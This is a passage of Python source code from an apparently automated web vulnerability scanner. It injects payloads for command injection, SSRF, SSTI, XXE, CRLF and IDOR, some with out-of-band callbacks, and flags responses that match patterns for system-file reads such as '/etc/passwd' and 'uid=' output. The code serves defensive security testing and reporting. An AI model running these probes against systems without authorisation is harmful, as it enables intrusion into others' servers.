            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for Command Injection indicators
            for error_type, error_pattern in ERROR_FINGERPRINTS.items():
                if error_type == "COMMAND_INJECTION" and re.search(error_pattern, content):
                    report.add_finding(
                        "Command Injection",
                        f"Command output or error message indicating command injection detected with payload '{escape(payload)}' in parameter '{param_name}'.",
                        "Critical", "Confirmed",
                        f"Payload: {payload}\nResponse snippet: {content[:500]}",
                        "Avoid executing OS commands with user-supplied input. Use safer alternatives like built-in library functions. If unavoidable, use strict input validation and command sanitization.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Payload: {payload}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                            "Observe the response for command output (e.g., directory listings, user IDs)."
                        ],
                        remediation_steps=[
                            "**Avoid Shell Execution:** Do not call external programs or shell commands with user-supplied input.",
                            "**Use Safe APIs:** Prefer using built-in, safe APIs for specific functionalities (e.g., `os.path` for file paths, `subprocess.run` with `shell=False` for commands).",
                            "**Strict Input Validation:** Validate and sanitize all user input rigorously. Use whitelisting for allowed characters and commands.",
                            "**Least Privilege:** Run the application with the minimum necessary system privileges."
                        ]
                    )
                    return # Found, move to next parameter

        # Test OOB Command Injection (if Interactsh is enabled)
        for payload in oob_cmd_payloads_to_try:
            if not interactsh_client: continue # Skip if no client

            unique_oob_id = str(uuid.uuid4())
            oob_payload = interactsh_client.get_oob_payload(payload.replace("{{INTERACTSH_DOMAIN}}", f"{unique_oob_id}.{{INTERACTSH_DOMAIN}}"))

            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = original_value + oob_payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None

            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for OOB interaction
            interaction = interactsh_client.check_for_interaction(unique_oob_id)
            if interaction:
                report.add_finding(
                    "OOB Command Injection",
                    f"An Out-of-Band (OOB) interaction was detected for payload '{escape(oob_payload)}' injected into parameter '{param_name}', indicating an OOB Command Injection vulnerability.",
                    "Critical", "Confirmed",
                    f"Payload: {oob_payload}\nOOB Interaction: {json.dumps(interaction, indent=2)}",
                    "Avoid executing OS commands with user-supplied input. Use safer alternatives. This is a confirmed critical vulnerability.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {oob_payload}\nInteractsh ID: {unique_oob_id}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    oob_interaction=interaction,
                    poc_steps=[
                        f"Configure an Interactsh client (e.g., `interactsh-client -s {interactsh_client.interactsh_server}`).",
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + oob_payload)}`",
                        f"Monitor your Interactsh client for an incoming interaction containing `{unique_oob_id}`."
                    ],
                    remediation_steps=[
                        "**Avoid Shell Execution:** Do not call external programs or shell commands with user-supplied input.",
                        "**Use Safe APIs:** Prefer using built-in, safe APIs for specific functionalities.",
                        "**Network Segmentation:** Restrict outbound connections from application servers to prevent OOB exfiltration.",
                        "**Strict Input Validation:** Validate and sanitize all user input rigorously."
                    ]
                )
                return # Found, move to next parameter

async def check_ssrf(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, interactsh_client: Optional[InteractshClient], **kwargs):
    """
    Checks for Server-Side Request Forgery (SSRF) vulnerabilities.
    Includes in-band and OOB SSRF.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for SSRF check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    ssrf_payloads_to_try = random.sample(SSRF_PAYLOADS, min(payload_count, len(SSRF_PAYLOADS)))
    oob_ssrf_payloads_to_try = random.sample(OOB_SSRF_PAYLOADS, min(payload_count, len(OOB_SSRF_PAYLOADS))) if interactsh_client else []

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        # Test In-Band SSRF
        for payload in ssrf_payloads_to_try:
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = payload # Replace value with SSRF payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for SSRF indicators (e.g., internal IP addresses, file content, AWS metadata)
            for error_type, error_pattern in ERROR_FINGERPRINTS.items():
                if error_type == "SSRF_INFO" and re.search(error_pattern, content):
                    report.add_finding(
                        "Server-Side Request Forgery (SSRF)",
                        f"Internal system information or error message indicating SSRF detected with payload '{escape(payload)}' in parameter '{param_name}'.",
                        "High", "Confirmed",
                        f"Payload: {payload}\nResponse snippet: {content[:500]}",
                        "Validate and sanitize all user-supplied URLs. Implement a whitelist of allowed domains/IPs. Block requests to internal/private IP ranges. Use network segmentation.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Payload: {payload}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(payload)}`",
                            "Observe the response for internal server information or unexpected content."
                        ],
                        remediation_steps=[
                            "**Input Validation:** Strictly validate all user-supplied URLs or network resources. Use a whitelist of allowed schemes, hosts, and ports.",
                            "**Block Private IP Ranges:** Prevent the application from making requests to private (RFC1918) IP addresses and loopback addresses.",
                            "**Network Segmentation:** Isolate the application from internal networks and sensitive resources.",
                            "**Disable Unused URL Schemes:** Disable URL schemes (e.g., `file://`, `gopher://`, `dict://`) that are not explicitly needed."
                        ]
                    )
                    return # Found, move to next parameter

        # Test OOB SSRF (if Interactsh is enabled)
        for payload in oob_ssrf_payloads_to_try:
            if not interactsh_client: continue # Skip if no client

            unique_oob_id = str(uuid.uuid4())
            oob_payload = interactsh_client.get_oob_payload(payload.replace("{{INTERACTSH_DOMAIN}}", f"{unique_oob_id}.{{INTERACTSH_DOMAIN}}"))

            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = oob_payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None

            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for OOB interaction
            interaction = interactsh_client.check_for_interaction(unique_oob_id)
            if interaction:
                report.add_finding(
                    "OOB Server-Side Request Forgery (SSRF)",
                    f"An Out-of-Band (OOB) interaction was detected for payload '{escape(oob_payload)}' injected into parameter '{param_name}', indicating an OOB SSRF vulnerability.",
                    "Critical", "Confirmed",
                    f"Payload: {oob_payload}\nOOB Interaction: {json.dumps(interaction, indent=2)}",
                    "Validate and sanitize all user-supplied URLs. Implement a whitelist of allowed domains/IPs. This is a confirmed critical vulnerability.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {oob_payload}\nInteractsh ID: {unique_oob_id}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    oob_interaction=interaction,
                    poc_steps=[
                        f"Configure an Interactsh client (e.g., `interactsh-client -s {interactsh_client.interactsh_server}`).",
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(oob_payload)}`",
                        f"Monitor your Interactsh client for an incoming interaction containing `{unique_oob_id}`."
                    ],
                    remediation_steps=[
                        "**Input Validation:** Strictly validate all user-supplied URLs or network resources. Use a whitelist of allowed schemes, hosts, and ports.",
                        "**Block Private IP Ranges:** Prevent the application from making requests to private (RFC1918) IP addresses and loopback addresses.",
                        "**Network Segmentation:** Isolate the application from internal networks and sensitive resources.",
                        "**Disable Unused URL Schemes:** Disable URL schemes (e.g., `file://`, `gopher://`, `dict://`) that are not explicitly needed."
                    ]
                )
                return # Found, move to next parameter

async def check_ssti(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for Server-Side Template Injection (SSTI) vulnerabilities.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for SSTI check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    ssti_payloads_to_try = random.sample(SSTI_PAYLOADS, min(payload_count, len(SSTI_PAYLOADS)))

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        for payload in ssti_payloads_to_try:
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = payload # Replace value with SSTI payload

            resp, content, _, final_url, duration, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for SSTI indicators (e.g., `7*7` evaluated to `49`, or command output)
            if "49" in content or "77" in content or re.search(r"uid=\d+\(.*?\)", content) or re.search(r"root:x:0:0:", content):
                report.add_finding(
                    "Server-Side Template Injection (SSTI)",
                    f"Template engine evaluated payload '{escape(payload)}' or command output detected, indicating SSTI vulnerability.",
                    "High", "Confirmed",
                    f"Payload: {payload}\nResponse snippet: {content[:500]}",
                    "Avoid user-supplied input in template rendering functions. Use a 'safe' mode if available, or strictly sanitize input before rendering.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {payload}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    poc_steps=[
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(payload)}`",
                        "Observe the response for the evaluated output (e.g., '49' from '{{7*7}}') or command execution results."
                    ],
                    remediation_steps=[
                        "**Separate User Input:** Never directly embed user-supplied input into template syntax.",
                        "**Context-Aware Escaping:** Use the template engine's built-in escaping mechanisms for all user-controlled data.",
                        "**Least Privilege Template Context:** Limit the objects and functions available within the template rendering context.",
                        "**Static Templates:** Prefer static templates or pre-compiled templates for user-controlled content."
                    ]
                )
                return # Found, move to next parameter

async def check_xxe(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, interactsh_client: Optional[InteractshClient], **kwargs):
    """
    Checks for XML External Entity (XXE) Injection vulnerabilities.
    Includes in-band and OOB XXE.
    """
    # XXE typically affects endpoints that parse XML content.
    # This check will attempt to send XML payloads to all discovered parameters,
    # but it's most effective if we can identify XML-parsing endpoints (e.g., via Content-Type header).
    
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for XXE check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    xxe_payloads_to_try = random.sample(XXE_PAYLOADS, min(payload_count, len(XXE_PAYLOADS)))
    oob_xxe_payloads_to_try = random.sample(OOB_XXE_PAYLOADS, min(payload_count, len(OOB_XXE_PAYLOADS))) if interactsh_client else []

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        # Test In-Band XXE
        for payload in xxe_payloads_to_try:
            # For XXE, we typically want to send the payload as the request body,
            # or as a parameter value if the parameter is directly embedded into an XML parser.
            # This is a heuristic. A more precise check would involve detecting XML content-types.
            
            # Option 1: Send as XML body (if method is POST and Content-Type is XML)
            headers_with_xml = {"Content-Type": "application/xml"}
            if report.session_headers: headers_with_xml.update(report.session_headers)

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None

            if param_method == "POST":
                # Try sending as raw XML body
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=payload.encode('utf-8'),
                    headers=headers_with_xml, proxy=cli_args.proxy
                )
                if resp and content and final_url:
                    # Check for XXE indicators
                    for error_type, error_pattern in ERROR_FINGERPRINTS.items():
                        if error_type == "XXE" and re.search(error_pattern, content):
                            report.add_finding(
                                "XML External Entity (XXE) Injection",
                                f"XML error or file content detected with payload (XML body) indicating XXE vulnerability.",
                                "High", "Confirmed",
                                f"Payload: {payload}\nResponse snippet: {content[:500]}",
                                "Disable DTD processing or external entity resolution in your XML parser. Validate and sanitize XML input.",
                                final_url, param_name, request_details=raw_req, response_details=content,
                                poc_notes=f"Payload sent as XML body.",
                                curl_poc=generate_poc(final_url, param_method, headers_with_xml, payload.encode('utf-8'), raw_req)[0],
                                python_poc=generate_poc(final_url, param_method, headers_with_xml, payload.encode('utf-8'), raw_req)[1],
                                poc_steps=[
                                    f"Send POST request to {final_url} with `Content-Type: application/xml` and body: `{escape(payload)}`",
                                    "Observe the response for file contents (e.g., `/etc/passwd` content) or XML parsing errors."
                                ],
                                remediation_steps=[
                                    "**Disable DTDs:** Configure your XML parser to completely disable DTDs (Document Type Definitions).",
                                    "**Disable External Entity Resolution:** If DTDs are necessary, disable external entity resolution.",
                                    "**Use Safe XML Parsers:** Use parsers that are known to be secure against XXE by default (e.g., `defusedxml` in Python).",
                                    "**Input Validation:** Validate XML input against a schema and sanitize any user-controlled data."
                                ]
                            )
                            return # Found, move to next parameter

            # Option 2: Send as parameter value (less common for direct XXE, but possible if param is embedded in XML)
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for XXE indicators in response
            for error_type, error_pattern in ERROR_FINGERPRINTS.items():
                if error_type == "XXE" and re.search(error_pattern, content):
                    report.add_finding(
                        "XML External Entity (XXE) Injection",
                        f"XML error or file content detected with payload '{escape(payload)}' in parameter '{param_name}'.",
                        "High", "Confirmed",
                        f"Payload: {payload}\nResponse snippet: {content[:500]}",
                        "Disable DTD processing or external entity resolution in your XML parser. Validate and sanitize XML input.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Payload sent as parameter value.",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(payload)}`",
                            "Observe the response for file contents or XML parsing errors."
                        ],
                        remediation_steps=[
                            "**Disable DTDs:** Configure your XML parser to completely disable DTDs (Document Type Definitions).",
                            "**Disable External Entity Resolution:** If DTDs are necessary, disable external entity resolution.",
                            "**Use Safe XML Parsers:** Use parsers that are known to be secure against XXE by default (e.g., `defusedxml` in Python).",
                            "**Input Validation:** Validate XML input against a schema and sanitize any user-controlled data."
                        ]
                    )
                    return # Found, move to next parameter

        # Test OOB XXE (if Interactsh is enabled)
        for payload in oob_xxe_payloads_to_try:
            if not interactsh_client: continue # Skip if no client

            unique_oob_id = str(uuid.uuid4())
            oob_payload = interactsh_client.get_oob_payload(payload.replace("{{INTERACTSH_DOMAIN}}", f"{unique_oob_id}.{{INTERACTSH_DOMAIN}}"))

            # Option 1: Send as XML body
            headers_with_xml = {"Content-Type": "application/xml"}
            if report.session_headers: headers_with_xml.update(report.session_headers)

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None

            if param_method == "POST":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=oob_payload.encode('utf-8'),
                    headers=headers_with_xml, proxy=cli_args.proxy
                )
                if resp and content and final_url:
                    interaction = interactsh_client.check_for_interaction(unique_oob_id)
                    if interaction:
                        report.add_finding(
                            "OOB XML External Entity (XXE) Injection",
                            f"An Out-of-Band (OOB) interaction was detected for XXE payload (XML body) indicating XXE vulnerability.",
                            "Critical", "Confirmed",
                            f"Payload: {oob_payload}\nOOB Interaction: {json.dumps(interaction, indent=2)}",
                            "Disable DTD processing or external entity resolution in your XML parser. This is a confirmed critical vulnerability.",
                            final_url, param_name, request_details=raw_req, response_details=content,
                            poc_notes=f"Payload sent as XML body.\nInteractsh ID: {unique_oob_id}",
                            curl_poc=generate_poc(final_url, param_method, headers_with_xml, oob_payload.encode('utf-8'), raw_req)[0],
                            python_poc=generate_poc(final_url, param_method, headers_with_xml, oob_payload.encode('utf-8'), raw_req)[1],
                            oob_interaction=interaction,
                            poc_steps=[
                                f"Configure an Interactsh client (e.g., `interactsh-client -s {interactsh_client.interactsh_server}`).",
                                f"Send POST request to {final_url} with `Content-Type: application/xml` and body: `{escape(oob_payload)}`",
                                f"Monitor your Interactsh client for an incoming interaction containing `{unique_oob_id}`."
                            ],
                            remediation_steps=[
                                "**Disable DTDs:** Configure your XML parser to completely disable DTDs (Document Type Definitions).",
                                "**Disable External Entity Resolution:** If DTDs are necessary, disable external entity resolution.",
                                "**Network Segmentation:** Restrict outbound connections from application servers."
                            ]
                        )
                        return # Found, move to next parameter

            # Option 2: Send as parameter value
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = oob_payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None

            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            interaction = interactsh_client.check_for_interaction(unique_oob_id)
            if interaction:
                report.add_finding(
                    "OOB XML External Entity (XXE) Injection",
                    f"An Out-of-Band (OOB) interaction was detected for XXE payload '{escape(oob_payload)}' in parameter '{param_name}', indicating XXE vulnerability.",
                    "Critical", "Confirmed",
                    f"Payload: {oob_payload}\nOOB Interaction: {json.dumps(interaction, indent=2)}",
                    "Disable DTD processing or external entity resolution in your XML parser. This is a confirmed critical vulnerability.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload sent as parameter value.\nInteractsh ID: {unique_oob_id}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    oob_interaction=interaction,
                    poc_steps=[
                        f"Configure an Interactsh client (e.g., `interactsh-client -s {interactsh_client.interactsh_server}`).",
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(oob_payload)}`",
                        f"Monitor your Interactsh client for an incoming interaction containing `{unique_oob_id}`."
                    ],
                    remediation_steps=[
                        "**Disable DTDs:** Configure your XML parser to completely disable DTDs (Document Type Definitions).",
                        "**Disable External Entity Resolution:** If DTDs are necessary, disable external entity resolution.",
                        "**Network Segmentation:** Restrict outbound connections from application servers."
                    ]
                )
                return # Found, move to next parameter

async def check_crlf_injection(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for CRLF Injection and HTTP Response Splitting vulnerabilities.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for CRLF check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    crlf_payloads_to_try = random.sample(CRLF_PAYLOADS, min(payload_count, len(CRLF_PAYLOADS)))

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        for payload in crlf_payloads_to_try:
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = original_value + payload

            resp, content, headers, final_url, _, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, headers, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, headers, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not headers or not final_url:
                continue

            # Check for CRLF injection indicators in response headers
            # Look for injected headers or unexpected content in the response
            injected_header_found = False
            for header_name, header_value in headers.items():
                if "crlfinjected=true" in header_value.lower() or "x-test: crlf-injected" in f"{header_name}: {header_value}".lower():
                    injected_header_found = True
                    break
            
            # Check for HTTP Response Splitting (e.g., second HTTP response in body)
            if "HTTP/1.1 200 OK" in content and "<h1>CRLF Injection Test</h1>" in content:
                report.add_finding(
                    "HTTP Response Splitting (CRLF Injection)",
                    f"HTTP Response Splitting detected. The payload '{escape(payload)}' injected into parameter '{param_name}' allowed injecting new HTTP headers or a second response.",
                    "Critical", "Confirmed",
                    f"Payload: {payload}\nResponse Headers: {json.dumps(headers, indent=2)}\nResponse Content Snippet: {content[:500]}",
                    "Strictly validate and encode all user input that is reflected into HTTP headers or response bodies. Prevent newline characters (%0d, %0a) from being injected.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {payload}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    poc_steps=[
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                        "Inspect the raw HTTP response for injected headers or a second HTTP response."
                    ],
                    remediation_steps=[
                        "**Strict Input Validation:** Filter out or encode newline characters (`%0D`, `%0A`) from all user-supplied input before it's used in HTTP headers or response bodies.",
                        "**Context-Aware Encoding:** Apply appropriate encoding (e.g., URL encoding) to user input when it's placed in a URL or header.",
                        "**Use Safe APIs:** Use APIs that automatically handle header construction and encoding, preventing injection."
                    ]
                )
                return # Found, move to next parameter

            elif injected_header_found:
                report.add_finding(
                    "CRLF Injection (Header Injection)",
                    f"CRLF Injection detected. The payload '{escape(payload)}' injected into parameter '{param_name}' allowed injecting a custom HTTP header.",
                    "High", "Confirmed",
                    f"Payload: {payload}\nInjected Headers: {json.dumps(headers, indent=2)}",
                    "Strictly validate and encode all user input that is reflected into HTTP headers. Prevent newline characters (%0d, %0a) from being injected.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {payload}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    poc_steps=[
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                        "Inspect the raw HTTP response headers for the injected header."
                    ],
                    remediation_steps=[
                        "**Strict Input Validation:** Filter out or encode newline characters (`%0D`, `%0A`) from all user-supplied input before it's used in HTTP headers.",
                        "**Context-Aware Encoding:** Apply appropriate encoding (e.g., URL encoding) to user input when it's placed in a URL or header.",
                        "**Use Safe APIs:** Use APIs that automatically handle header construction and encoding, preventing injection."
                    ]
                )
                return # Found, move to next parameter

async def check_idor(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for Insecure Direct Object Reference (IDOR) vulnerabilities.
    Fuzzes common ID patterns (numeric, UUID, common words).
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for IDOR check on {url}")
        return

    # Fetch original response to compare against
    original_resp, original_content, _, _, original_duration, _ = await fetch_url(
        session, concurrency_manager, url, proxy=cli_args.proxy, headers=report.session_headers
    )
    if not original_resp or not original_content:
        logger.debug(f"Could not fetch original response for IDOR check on {url}. Skipping.")
        return

    # Get baseline for anomaly detection
    baseline = report.baseline_profiles.get(normalize_url(url))
    if not baseline:
        logger.warning(f"No baseline for {url}, skipping anomaly-based IDOR checks.")
        return

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']
        
        fuzz_values = set()

        # Numeric IDOR fuzzing
        if original_value.isdigit():
            num_val = int(original_value)
            for i in range(1, IDOR_NUMERIC_FUZZ_RANGE + 1):
                fuzz_values.add(str(num_val + i))
                fuzz_values.add(str(num_val - i))
            fuzz_values.update(IDOR_COMMON_IDS) # Add common IDs
        elif re.match(r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$', original_value):
            # UUID fuzzing
            for _ in range(IDOR_UUID_FUZZ_COUNT):
                fuzz_values.add(str(uuid.uuid4()))
        else:
            # Common word fuzzing
            fuzz_values.update(IDOR_COMMON_WORDS)
            # Try appending/prepending common words
            for word in IDOR_COMMON_WORDS:
                fuzz_values.add(f"{original_value}_{word}")
                fuzz_values.add(f"{word}_{original_value}")

        for fuzz_value in fuzz_values:
            if fuzz_value == original_value: continue # Skip original value

            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = fuzz_value

            resp, content, _, final_url, duration, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for IDOR:
            # 1. If response is significantly different (e.g., 200 OK when original was 403/404, or content change)
            # 2. If the response contains sensitive information that should not be accessible to current user
            #    (This requires manual review or advanced content analysis, for now, rely on anomaly)
            
            # Simple heuristic: If the response is NOT anomalous, but the content is different from original
            # and the status code is 200, it might indicate IDOR.
            # Or, if the status code changes from 403/404 to 200.
            
            is_anomaly = is_response_anomalous(report, final_url, resp, content, duration)
            
            # Scenario 1: Accessing a different resource with 200 OK, and content is different
            if resp.status == 200 and not is_anomaly: # Not flagged as anomaly, but content differs from original
                # Calculate content similarity to original content
